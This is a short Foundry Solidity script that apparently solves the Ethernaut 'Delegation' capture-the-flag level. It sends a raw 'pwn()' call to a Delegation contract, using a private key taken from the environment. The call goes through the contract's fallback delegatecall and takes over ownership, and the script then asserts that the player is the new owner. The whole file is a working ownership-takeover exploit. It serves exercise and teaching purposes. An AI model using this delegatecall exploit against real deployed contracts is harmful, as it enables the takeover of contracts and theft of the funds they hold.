// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Script, console} from "forge-std/Script.sol";
import {Delegate, Delegation} from "../src/Delegate.sol";

contract DelegateScript is Script {
    Delegation private target;
    address private player;

    function setUp() public {
        target = Delegation(vm.envAddress("TARGET_CONTRACT_ADDRESS"));
        player = vm.envAddress("PLAYER_ADDRESS");
    }

    function run() public {
        vm.startBroadcast(vm.envUint("PK"));

        address(target).call(abi.encodeWithSignature("pwn()"));

        assert(target.owner() == player);

        vm.stopBroadcast();
    }
}
